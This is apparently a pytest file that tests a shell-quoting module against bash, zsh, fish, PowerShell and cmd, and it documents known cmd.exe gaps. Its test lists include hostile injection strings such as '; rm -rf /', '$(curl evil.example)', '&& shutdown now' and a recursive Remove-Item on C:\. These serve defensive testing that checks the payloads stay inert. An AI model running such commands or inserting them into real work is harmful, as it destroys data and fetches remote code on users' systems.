"""Quoting tests.

Three layers, in increasing order of how much they can surprise us:

  1. unit      -- the quoter's own contract (refusals, empty string, types)
  2. oracle    -- run the real shell and compare bytes
  3. property  -- generate adversarial strings and run them through the oracle

Layer 2 is the one that matters. Layer 1 can only confirm what the author
believed; layer 2 asks the shell.
"""

from __future__ import annotations

import pytest

from cl_ai.platform_ import PROFILES, is_available
from cl_ai.render import quoting
from cl_ai.render.quoting import QuotingError

from .shell_oracle import roundtrip

#: cmd.exe is genuinely unfinished, and marked xfail rather than skipped so we
#: notice the day it starts passing.
#:
#: Two unsolved problems, neither cosmetic:
#:   1. The oracle is not faithful. `echo "a|b"` in cmd emits the quotes
#:      literally, so it cannot report what a program would receive in argv.
#:      A correct oracle must invoke a real program and have it report argv.
#:   2. cmd has TWO parsing layers -- cmd.exe's own metacharacter pass, and
#:      then the target program's argv parser (usually MSVCRT, which wants
#:      \" rather than the "" this module currently emits). Getting one right
#:      does not get the other right.
#:
#: Until both are settled, cmd rendering should be considered unsupported
#: rather than working. The quoter already refuses the actively dangerous
#: cases (%VAR%, !VAR!, newlines), which is the safe failure direction.
_CMD_UNSOLVED = "cmd.exe quoting and its oracle are both unfinished; see note in tests"

POSIX_SHELLS = ["bash", "zsh", "fish"]
PS_SHELLS = ["powershell", "pwsh"]
ALL_SHELLS = POSIX_SHELLS + PS_SHELLS + ["cmd"]

#: Values that must survive every shell that can represent them at all.
#: Each entry is here because it broke something, somewhere, for someone.
NASTY = [
    "simple",
    "with space",
    "  leading and trailing  ",
    "",
    "single'quote",
    "double\"quote",
    "both'and\"quotes",
    "back`tick",
    "dollar$sign",
    "dollar${brace}",
    "subshell$(whoami)",
    "backtick`whoami`",
    "semi;colon",
    "amp&ersand",
    "double&&amp",
    "pipe|char",
    "redirect>file",
    "redirect<file",
    "glob*star",
    "question?mark",
    "bracket[abc]",
    "brace{a,b}",
    "tilde~home",
    "bang!history",
    "percent%VAR%",
    "hash#comment",
    "paren(then)",
    "caret^up",
    "at@sign",
    "equals=sign",
    "colon:sep",
    "comma,sep",
    "plus+sign",
    "back\\slash",
    "trailing\\",
    "double\\\\slash",
    "newline\nhere",
    "tab\there",
    "-looks-like-a-flag",
    "--force",
    "/looks/like/a/path",
    "C:\\Windows\\System32",
    "\\\\server\\share",
    "my report (final).txt",
    "emoji \U0001f600 here",
    "cjk \u4e2d\u6587 here",
    "rtl \u202e override",
    "quote'in\"middle`and$all",
    "; rm -rf ~",
    "$(curl evil.example)",
    "&& shutdown now",
    "| tee /etc/passwd",
    "a" * 4096,
]

#: Values a shell genuinely cannot carry. Refusal is the correct behaviour.
IMPOSSIBLE = ["nul\x00byte", "bell\x07here", "esc\x1bhere"]


# ---------------------------------------------------------------- unit layer

@pytest.mark.parametrize("shell_id", ALL_SHELLS)
def test_empty_string_is_quoted_not_dropped(shell_id):
    """An empty argument must remain an argument, not vanish from argv."""
    q = quoting.quote("", PROFILES[shell_id])
    assert q in ("''", '""'), f"{shell_id} dropped the empty string: {q!r}"


@pytest.mark.parametrize("shell_id", ALL_SHELLS)
@pytest.mark.parametrize("value", IMPOSSIBLE)
def test_control_characters_are_refused(shell_id, value):
    with pytest.raises(QuotingError):
        quoting.quote(value, PROFILES[shell_id])


@pytest.mark.parametrize("value", ["has%percent%", "has!bang!", "new\nline"])
def test_cmd_refuses_what_it_cannot_represent(value):
    """cmd.exe expands %VAR% and !VAR! even inside quotes, with no escape.

    Emitting something that happens to work interactively but misfires in a
    batch file would be exactly the silent-wrongness this module exists to
    prevent.
    """
    with pytest.raises(QuotingError):
        quoting.quote(value, PROFILES["cmd"])


@pytest.mark.parametrize("shell_id", ALL_SHELLS)
def test_non_string_is_a_type_error_not_a_quoting_error(shell_id):
    with pytest.raises(TypeError):
        quoting.quote(5, PROFILES[shell_id])  # type: ignore[arg-type]


def test_posix_never_leaves_an_unescaped_quote():
    for value in NASTY:
        if "\x00" in value:
            continue
        q = quoting.quote(value, PROFILES["bash"])
        if q.startswith("'"):
            inner = q[1:-1]
            assert "'" not in inner.replace("'\\''", ""), f"unescaped quote in {q!r}"


def test_safe_values_are_not_needlessly_quoted():
    """Cosmetic, but it is what makes a suggestion readable in the buffer."""
    assert quoting.quote("hello", PROFILES["bash"]) == "hello"
    assert quoting.quote("HEAD~1", PROFILES["bash"]) != "HEAD~1"  # ~ expands


@pytest.mark.parametrize("shell_id", ALL_SHELLS)
@pytest.mark.parametrize("value", ["-Force", "--force", "-rf", "-"])
def test_flaglike_values_are_quoted_everywhere(shell_id, value):
    """Regression: POSIX left "--force" bare while PowerShell quoted it.

    quote() is for VALUES -- the renderer emits flags itself. A bare leading
    dash is read by the target program as an option rather than as data, so a
    filename like "-rf" would silently become a flag. shlex.quote leaves these
    bare, which is right for its purpose and wrong for ours; the original bug
    was inheriting that behaviour on one platform only.
    """
    quoted = quoting.quote(value, PROFILES[shell_id])
    assert quoted != value, f"{shell_id} left a flag-like value bare: {quoted!r}"
    assert quoted[0] in "'\"", f"{shell_id} did not quote it: {quoted!r}"


# -------------------------------------------------------------- oracle layer

@pytest.mark.parametrize("shell_id", ALL_SHELLS)
@pytest.mark.parametrize("value", NASTY)
def test_roundtrip_through_real_shell(shell_id, value):
    """Quote it, run the real shell, get the same bytes back."""
    if not is_available(shell_id):
        pytest.skip(f"{shell_id} not installed here")

    try:
        quoting.quote(value, PROFILES[shell_id])
    except QuotingError:
        pytest.skip(f"{shell_id} refuses this value by design")

    if shell_id == "cmd":
        pytest.xfail(_CMD_UNSOLVED)

    recovered = roundtrip(value, shell_id)
    assert recovered == value, (
        f"{shell_id} round-trip mismatch\n"
        f"  sent     : {value!r}\n"
        f"  recovered: {recovered!r}"
    )


# ------------------------------------------------------------ security layer

INJECTIONS = [
    "; rm -rf /",
    "&& shutdown -h now",
    "| tee /tmp/pwned",
    "$(touch /tmp/pwned)",
    "`touch /tmp/pwned`",
    "\ntouch /tmp/pwned",
    "' ; touch /tmp/pwned ; '",
    "'; Remove-Item C:\\ -Recurse; '",
    "$(Invoke-Expression 'evil')",
]


@pytest.mark.parametrize("shell_id", ALL_SHELLS)
@pytest.mark.parametrize("payload", INJECTIONS)
def test_injection_payload_stays_inert(shell_id, payload):
    """A hostile value must come back as data, never execute.

    The strongest available assertion: run it for real and require the shell to
    hand back the payload verbatim. If any part had executed, the recovered
    text would differ.
    """
    if not is_available(shell_id):
        pytest.skip(f"{shell_id} not installed here")
    if shell_id == "cmd":
        pytest.xfail(_CMD_UNSOLVED)
    try:
        quoting.quote(payload, PROFILES[shell_id])
    except QuotingError:
        return  # refusing is a correct, safe outcome

    recovered = roundtrip(payload, shell_id)
    assert recovered == payload, (
        f"SECURITY: {shell_id} altered a hostile payload\n"
        f"  sent     : {payload!r}\n"
        f"  recovered: {recovered!r}"
    )


# ----------------------------------------------------------- differential

def test_matches_shlex_on_posix_semantics():
    """Differential check against the stdlib.

    We may legitimately differ in *form* (shlex is not required to pick the
    same representation), but never in meaning -- so compare what the shell
    recovers, not the quoted string.
    """
    import shlex

    if not is_available("bash"):
        pytest.skip("bash not installed here")

    for value in NASTY:
        if "\x00" in value:
            continue
        ours = quoting.quote(value, PROFILES["bash"])
        theirs = shlex.quote(value)
        if ours != theirs:
            # Different form is fine; different meaning is not.
            assert roundtrip(value, "bash") == value
